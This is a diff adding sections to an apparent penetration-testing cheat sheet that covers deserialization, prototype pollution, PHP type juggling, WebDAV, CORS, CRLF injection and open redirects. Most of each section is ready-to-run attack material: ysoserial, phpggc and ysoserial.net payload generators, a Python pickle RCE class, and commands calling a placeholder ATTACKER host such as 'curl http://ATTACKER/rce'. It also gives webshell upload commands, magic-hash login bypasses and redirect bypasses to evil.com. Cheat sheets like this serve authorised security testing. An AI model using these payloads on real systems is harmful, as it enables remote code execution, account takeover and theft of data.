@@ -193,6 +193,162 @@ curl -s -X POST https://target.com/graphql \
 # /usr/share/seclists/Discovery/Web-Content/swagger*.txt
 ```
 
+## Deserialization -- Java (ysoserial)
+Identify: Java stack traces in errors, `rO0AB` base64 prefix, `.ser` files,
+`Content-Type: application/x-java-serialized-object`.
+```bash
+# Generate payload (try multiple gadgets — depends on target's classpath)
+java -jar /opt/ysoserial.jar CommonsCollections6 'curl http://ATTACKER/rce' | base64 -w0
+java -jar /opt/ysoserial.jar CommonsCollections1 'ping -c1 ATTACKER' | base64 -w0
+
+# Common gadgets to try: CommonsCollections1-7, CommonsCollections10,
+# CommonsCollections13, Groovy1, Spring1, Spring2, JBossInterceptors1,
+# Jdk7u21, BeanShell1, Clojure, Hibernate1, URLDNS (detection only)
+
+# Inject: replace the serialized object in the request (cookie, POST param,
+# custom header) with your payload. Base64-decode if the app expects raw bytes.
+```
+
+## Deserialization -- PHP (phpggc)
+Identify: `O:4:"User":2:{...}` serialized PHP object format, or base64 of same.
+```bash
+# List available gadget chains
+phpggc -l
+phpggc -l <framework>       # e.g. phpggc -l Laravel
+
+# Generate payload
+phpggc Laravel/RCE10 system 'id'
+phpggc Symfony/RCE4 exec 'curl http://ATTACKER/rce'
+phpggc Monolog/RCE1 exec 'id' -b   # -b = base64 output
+
+# Common frameworks: Laravel, Symfony, Monolog, Guzzle, WordPress, Magento,
+# Doctrine, Slim, Yii, CakePHP, SwiftMailer, Phalcon
+```
+
+## Deserialization -- .NET (ysoserial.net)
+Identify: ViewState blobs, `__VIEWSTATE` hidden field, SOAP/XML with .NET
+type names, `AAEAAAD` base64 prefix, `BinaryFormatter` in errors.
+```bash
+# Generate payload (Windows tool, or run via mono/wine)
+ysoserial.exe -g WindowsIdentity -f Json.Net -c 'powershell -e <b64cmd>'
+ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c 'cmd /c whoami'
+ysoserial.exe -g ObjectDataProvider -f Json.Net -c 'calc.exe'
+
+# ViewState deserialization (needs machineKey from web.config leak)
+ysoserial.exe -p ViewState -g TypeConfuseDelegate \
+  --validationkey=<KEY> --validationalg=SHA1 \
+  --generator=<GEN> --islegacy -c 'cmd /c whoami'
+```
+
+## Deserialization -- Python (pickle)
+Identify: base64-decoded data starts with `\x80` (protocol marker), or
+`cposix\nsystem\n` in plaintext pickle. No gadget tool needed — pickle RCE
+is trivial because `__reduce__` controls deserialization.
+```python
+import pickle, base64, os
+class RCE:
+    def __reduce__(self):
+        return (os.system, ('curl http://ATTACKER/rce',))
+payload = base64.b64encode(pickle.dumps(RCE())).decode()
+print(payload)
+# Inject wherever the app unpickles user input (cookies, APIs, Redis, Celery)
+```
+Also check: PyYAML `yaml.load()` (use `!!python/object/apply:os.system`),
+jsonpickle, shelve.
+
+## Prototype Pollution (Node.js)
+Pollute `Object.prototype` via `__proto__` or `constructor.prototype` in JSON
+input. Leads to RCE when a code path reads from prototype (e.g., `child_process`
+spawn options, template engine options).
+```json
+// Merge/assign payload (POST JSON body):
+{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require('child_process').execSync('id').toString())", "NODE_OPTIONS": "--require /proc/self/cmdline"}}
+// Or via constructor:
+{"constructor": {"prototype": {"polluted": true}}}
+```
+Test: inject `{"__proto__": {"test": "polluted"}}`, then check if a new
+empty object `{}` has property `test`. Tools: `pp-finder`, `ppmap`.
+
+## Type Juggling (PHP)
+PHP loose comparison (`==`) treats strings starting with `0e` as float zero,
+so `"0e123" == "0e456"` is true. Arrays bypass `strcmp()` (returns NULL,
+which `==` treats as 0).
+```
+# Login bypass when password check uses == instead of ===:
+password=0e123456           # if hash starts with 0e (Magic Hashes)
+password[]=                 # array injection: strcmp([], hash) -> NULL == 0
+
+# Magic hash values (md5 starts with 0e, all digits after):
+240610708  -> md5: 0e462097431906509019562988736854
+QNKCDZO   -> md5: 0e830400451993494058024219903391
+aabg7XSs   -> md5: 0e087386482136013740957780965295
+```
+
+## WebDAV Upload
+PUT method enabled on the server allows direct file upload.
+```bash
+# Test if PUT is allowed
+curl -X OPTIONS https://target.com/ -v 2>&1 | grep -i allow
+
+# Upload a webshell
+curl -X PUT https://target.com/shell.aspx -d @shell.aspx
+curl -X PUT https://target.com/shell.php --data-binary @shell.php
+
+# cadaver (interactive WebDAV client)
+cadaver https://target.com/webdav/
+# > put shell.php
+
+# davtest (auto-test upload + execution of multiple file types)
+davtest -url https://target.com/webdav/
+```
+
+## CORS Misconfiguration
+Reflected `Origin` in `Access-Control-Allow-Origin` with
+`Access-Control-Allow-Credentials: true` → steal authenticated data cross-origin.
+```bash
+# Test for reflected origin
+curl -s -H "Origin: https://evil.com" https://target.com/api/me -v 2>&1 \
+  | grep -i 'access-control'
+# If Access-Control-Allow-Origin: https://evil.com → exploitable
+
+# Test null origin (sandboxed iframe)
+curl -s -H "Origin: null" https://target.com/api/me -v 2>&1 \
+  | grep -i 'access-control'
+```
+Exploit: host a page on attacker domain that fetches the target API with
+`credentials: 'include'` → victim's browser sends cookies, response readable.
+
+## CRLF Injection
+Inject `%0d%0a` (carriage return + line feed) in URL or header values to
+insert arbitrary HTTP headers or split the response.
+```bash
+# Test: inject a header via URL parameter
+curl -v "https://target.com/redirect?url=http://target.com%0d%0aX-Injected:%20true"
+
+# XSS via header injection (inject into Set-Cookie or reflected header)
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
+
+# Session fixation via Set-Cookie injection
+%0d%0aSet-Cookie:%20session=attacker_value
+```
+
+## Open Redirect
+Unvalidated redirect parameter → chain with SSRF, OAuth token theft, or
+phishing (victim trusts the domain in the link).
+```bash
+# Common parameter names to test:
+# ?url= ?redirect= ?next= ?return= ?dest= ?continue= ?redir= ?target= ?goto=
+
+# Bypass filters:
+https://target.com/redirect?url=//evil.com           # protocol-relative
+https://target.com/redirect?url=https://evil.com      # direct
+https://target.com/redirect?url=https://target.com@evil.com  # basic-auth trick
+https://target.com/redirect?url=https://target.com.evil.com  # subdomain trick
+https://target.com/redirect?url=%2F%2Fevil.com        # URL-encoded //
+
+# Chain with OAuth: steal authorization code via redirect_uri manipulation
+```
+
 ## Useful wordlists (pre-installed via seclists)
 ```
 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
